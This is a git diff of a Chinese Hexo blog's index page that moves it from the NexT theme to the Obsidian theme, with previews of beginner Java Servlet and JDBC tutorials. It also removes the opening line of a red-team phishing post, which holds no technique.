@@ -1,809 +1,257 @@
+
 <!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next mist use-motion" lang="zh-CN">
+<html lang="zh-CN" class="loading">
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=6.7.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '6.7.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sriracha :)">
-<meta property="og:url" content="http://sherlocz.github.io/index.html">
-<meta property="og:site_name" content="Sriracha :)">
-<meta property="og:locale" content="zh-CN">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sriracha :)">
-
-
-
-  <link rel="alternate" href="/atom.xml" title="Sriracha :)" type="application/atom+xml">
-
-
-
-
-  <link rel="canonical" href="http://sherlocz.github.io/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>Sriracha :)</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sriracha :) - Wow, the smell is great!</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    
+    <meta name="author" content="sher10ck"> 
+    <link rel="alternative" href="atom.xml" title="Sriracha :)" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+    <link rel="stylesheet" href="/css/obsidian.css">
+    <link rel="stylesheet" href="/css/ball-atom.min.css">
 </head>
+</html>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sriracha :)</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
     </div>
-    
-      
-        <p class="site-subtitle">Wow, the smell is great!</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
+    <span id="config-title" style="display:none">Sriracha :)</span>
+    <div id="loader"></div>
+    <div class="nav">
+    <ul id="menu-menu" class="menu">
         
+        <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/tags/" title="TAGS">TAGS</a>
+        </li>
         
+        <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/archives/" title="ARCHIVES">ARCHIVES</a>
+        </li>
         
-          
-          <li class="menu-item menu-item-home menu-item-active">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
+        <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/About_Me/" title="ABOUT">ABOUT</a>
+        </li>
         
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-pentest">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/Pentest" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>渗透测试</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-audit">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/Audit" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>代码审计</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-python">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/Python" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Python</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about_me">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/About_Me" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>关于我</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-weapon">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/weapon" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Weapon</a>
-
-  </li>
-
-      
-      
     </ul>
-  
-
-  
-    
-
-  
-
-  
-</nav>
-
-
-
-  
-
-
-
+    <p class="copyright" id="copyright">
+        &copy; 2020 sher10ck.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+    </p>
 </div>
-    </header>
 
+<div id="container">
     
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/07/05/IDEA新建Servlet/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/07/05/IDEA新建Servlet/" class="post-title-link" itemprop="url">IDEA新建Servlet</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-07-05 14:28:48 / 修改时间：15:44:35" itemprop="dateCreated datePublished" datetime="2020-07-05T14:28:48+08:00">2020-07-05</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+<div class="search-box">
+    <form class="site-search-form">
+        <span class="iconfont icon-search"></span>
+        <input type="text" id="local-search-input" class="st-search-input" />
+        <div class="iconfont icon-cross search-box-close"></div>
+    </form>
+    <div class="search-scrollable">
+        <div id="local-search-result" class="local-search-result-cls" data-initialise="首次搜索，正在载入索引文件，请稍后……"
+            data-start="输入关键词搜索。" data-empty="没有找到内容，请尝试更换检索词。">
+            <span>输入关键词搜索。</span>
         </div>
-      </header>
+    </div>
+</div>
+<div id="header">
+    <div>
+        <div class="logo animated fadeInDown">
+            <img src="/img/favicon.png" alt="">
+            <a class="image-logo" href="/"></a>
+        </div>
+        <ul id="menu-menu" class="menu text-menu">
+            
+            <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+                <a href="/tags/" title="TAGS" class="menu-link">TAGS</a>
+            </li>
+            
+            <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+                <a href="/archives/" title="ARCHIVES" class="menu-link">ARCHIVES</a>
+            </li>
+            
+            <li class="animated fadeInDown menu-item menu-item-type-post_type menu-item-object-page">
+                <a href="/About_Me/" title="ABOUT" class="menu-link">ABOUT</a>
+            </li>
+            
+            
+            <li class="animated fadeInDown search-bar iconfont icon-search"></li>
+            
+        </ul>
+        <div class="iconfont icon-menu switchmenu gradient-text animated fadeInDown"></div>
+    </div>
+</div>
+<div id="screen">
+    <div id="mark">
+        <div class="cover animated fadeIn" style="
+            animation-delay: 900ms;
+            animation-duration: 2.8s;
+            background-image:
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.56), #100e17),
+                url(/img/cover.jpg);">
+        </div>
+    </div>
     
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
+    <div id="post0" class="else">
+        <p class="animated fadeInDown">
+            
+            <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            七月 05, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown">
+            <a href="/2020/07/05/IDEA新建Servlet/" title="IDEA新建Servlet" class="posttitle">IDEA新建Servlet</a></h3>
         
-          
+        <p class="post-count animated fadeInDown">
+            
+            <span>
+                <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                6.6k
+            </span>
+            
+            
+            <span>
+                <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                6 mins.
+            </span>
+            
+            
+        </p>
+        
+        
+        <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/JAVA/">JAVA</a></li></ul>
+        
+        <div class="md-content animated fadeIn">
+            
             <p>Servlet为Server Applet，即服务器在启动时会运行的小程序。</p>
-<p>通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面复写了servlet的方法，就可以被tomcat解析出来。</p>
-<h1 id="IDEA与Tomcat联动"><a href="#IDEA与Tomcat联动" class="headerlink" title="IDEA与Tomcat联动"></a>IDEA与Tomcat联动</h1><p>点击Run—&gt;Debug-&gt;Edit Configuaration-&gt;+(Add New Comfiguaration)<br>选中Tomcat-&gt;local，箭头处选中你Tomcat安装的路径Apply保存。<br><img src="/2020/07/05/IDEA新建Servlet/tomcat.png" alt></p>
-<p>然后File-&gt;New Module，新建一个Web Application<br><img src="/2020/07/05/IDEA新建Servlet/web.png" alt></p>
-<p>新建好之后目录结构如下：<br><img src="/2020/07/05/IDEA新建Servlet/ok.png" alt></p>
-<p>点击Shift+F10运行起来，这个时候我们的index.jsp被成功运行起来了<br><img src="/2020/07/05/IDEA新建Servlet/8888.png" alt></p>
-<p>箭头所示的地方可以自定义我们访问的url路径。<br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt></p>
-<h1 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h1><p>首先我们在src目录下新建一个包，然后新建一个ServletDemo.class，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package cn.s1.web.servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ServletDemo implements Servlet &#123;</span><br><span class="line">	/*Servlet初始化时运行，只运行一次*/</span><br><span class="line">    @Override</span><br><span class="line">    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	/*获取servlet的配置信息*/</span><br><span class="line">    @Override</span><br><span class="line">    public ServletConfig getServletConfig() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">	/*每次servlet被访问时运行一次*/</span><br><span class="line">    @Override</span><br><span class="line">    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Hello Servlet!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">	/*获取servlet的一些信息*/</span><br><span class="line">    @Override</span><br><span class="line">    public String getServletInfo() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">	/*在服务器关闭的时候运行*/</span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>首先我们需要将这个类implements Servlet，由于Servlet这个接口有抽象类的方法，我们在集成的时候需要重写，这里我重写service这个方法输出了一行字。</p>
-<p>然后我们需要配置web.xml，在其中设置好我们servlet的路径和解析的类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">		//设置servlet名称</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">		//设置对应的class类</span><br><span class="line">        &lt;servlet-class&gt;cn.s1.web.servlet.ServletDemo&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">		//Demo这个servlet解析时候需要访问的url地址</span><br><span class="line">        &lt;url-pattern&gt;/Demo&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这个时候我们再运行该项目，访问<a href="http://localhost:8888/Demo，结果如下：" target="_blank" rel="noopener">http://localhost:8888/Demo，结果如下：</a><br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt><br>结果为空白，我们看控制台输出的信息：<br><img src="/2020/07/05/IDEA新建Servlet/hello.png" alt></p>
-<p>和我们重写的service方法打印的字符串一样，说明创建成功！</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/07/04/JAVA学习-JDBC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/07/04/JAVA学习-JDBC/" class="post-title-link" itemprop="url">JAVA学习-JDBC</a>
-              
+<p>通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面...</p>
             
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-07-04 10:23:06" itemprop="dateCreated datePublished" datetime="2020-07-04T10:23:06+08:00">2020-07-04</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2020-07-05 12:46:36" itemprop="dateModified" datetime="2020-07-05T12:46:36+08:00">2020-07-05</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+            <span class="read-more"><a href="/2020/07/05/IDEA新建Servlet/" title="查看全文" class="posttitle">查看全文</a>
+                <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>jdbc-mysql驱动下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dev.mysql.com/downloads/connector/j/5.1.html</span><br></pre></td></tr></table></figure></p>
-<p>eclipse启动，在项目目录下新建一个Libs文件夹，将我们下载的mysql-connector-java.jar包放在这个文件夹中，文件结构如下：<br><img src="/2020/07/04/JAVA学习-JDBC/tree.png" alt></p>
-<p>详细代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package cn.sl.jdbc;</span><br><span class="line"></span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line"></span><br><span class="line">public class JdbcDemo &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">		//导入驱动jar包</span><br><span class="line">		//注册驱动</span><br><span class="line">		Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">		//获取连接对象</span><br><span class="line">		Connection con = DriverManager.getConnection(&quot;jdbc:mysql:///tbtest&quot;, &quot;root&quot;, &quot;root&quot;);</span><br><span class="line">		//定义sql语句</span><br><span class="line">//		String updatesql = &quot;update info set phone = 15784561236 where name = &apos;admin&apos;&quot;;</span><br><span class="line">		String selectsql = &quot;select * from info&quot;;</span><br><span class="line">		//获取执行sql语句的对象</span><br><span class="line">		Statement stmt = con.createStatement();</span><br><span class="line">		//执行sql语句</span><br><span class="line">		ResultSet rs  = stmt.executeQuery(selectsql);</span><br><span class="line">//		int count = stmt.executeUpdate(updatesql);</span><br><span class="line">		//处理结果</span><br><span class="line">		rs.next();</span><br><span class="line">		System.out.println(rs.getString(1));</span><br><span class="line">//		System.out.println(count);</span><br><span class="line">		//释放</span><br><span class="line">		stmt.close();</span><br><span class="line">		con.close();</span><br><span class="line">		rs.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="DriverManager-驱动管理对象"><a href="#DriverManager-驱动管理对象" class="headerlink" title="DriverManager(驱动管理对象)"></a>DriverManager(驱动管理对象)</h2><p>通过查看com.mysql.jdbc.Driver的源码我们发现，Driver类中存在静态代码块，利用了registerDriver来注册驱动：<br><img src="/2020/07/04/JAVA学习-JDBC/static.png" alt></p>
-<h2 id="Connection-数据库连接对象"><a href="#Connection-数据库连接对象" class="headerlink" title="Connection(数据库连接对象)"></a>Connection(数据库连接对象)</h2><h2 id="Statement-执行sql的对象"><a href="#Statement-执行sql的对象" class="headerlink" title="Statement(执行sql的对象)"></a>Statement(执行sql的对象)</h2><h2 id="ResultSet-封装查询结果"><a href="#ResultSet-封装查询结果" class="headerlink" title="ResultSet(封装查询结果)"></a>ResultSet(封装查询结果)</h2><p>next():游标向下移动一行<br>getXxx():获取数据(如getInt()/getString())</p>
-<h2 id="PreparedStatement-执行sql语句的对象"><a href="#PreparedStatement-执行sql语句的对象" class="headerlink" title="PreparedStatement(执行sql语句的对象)"></a>PreparedStatement(执行sql语句的对象)</h2>
-          
-        
-      
     </div>
-
     
+</div>
 
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sherlocz.github.io/2020/06/24/钓鱼小结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/06/24/钓鱼小结/" class="post-title-link" itemprop="url">钓鱼小结</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2020-06-24 17:15:32" itemprop="dateCreated datePublished" datetime="2020-06-24T17:15:32+08:00">2020-06-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2020-07-02 20:16:31" itemprop="dateModified" datetime="2020-07-02T20:16:31+08:00">2020-07-02</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="typed-text"></span>
+                </p>
+            </div>
         </div>
-      </header>
-    
+    </div>
+</div>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
+    <div id="primary">
         
-          
-            <p>攻防演练中，有的时候我们很难产出大量的Web漏洞达到我们想要的效果，这个时候若目标企业员工安全意识薄弱，钓鱼是个非常好的选择。</p>
-<p><img src="/2020/06/24/钓鱼小结/封面.jpg" alt></p>
-<h1 id="钓鱼突破口选择"><a href="#钓鱼突破口选择" class="headerlink" title="钓鱼突破口选择"></a>钓鱼突破口选择</h1><ul>
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            七月 04, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/07/04/JAVA学习-JDBC/" title="JAVA学习-JDBC" class="posttitle">JAVA学习-JDBC</a></h3>
+        
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        4.3k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        4 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/JAVA/">JAVA</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <p>jdbc-mysql驱动下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dev.mysql.com/downloads/connector/j/5.1.html</span><br></pre></td></tr></table></figure></p>
+<p>eclipse启动，在项目目录下新建一个Libs文件夹，将我们下载的mysql-connector-java.jar包放在这个文件夹中，文件结构如下：<br></p>
+<p>详细代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16...</span></pre></td></tr></table></figure></p>
+            
+            <span class="read-more"><a href="/2020/07/04/JAVA学习-JDBC/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+        </div>
+    </div>
+</div>
+
+
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
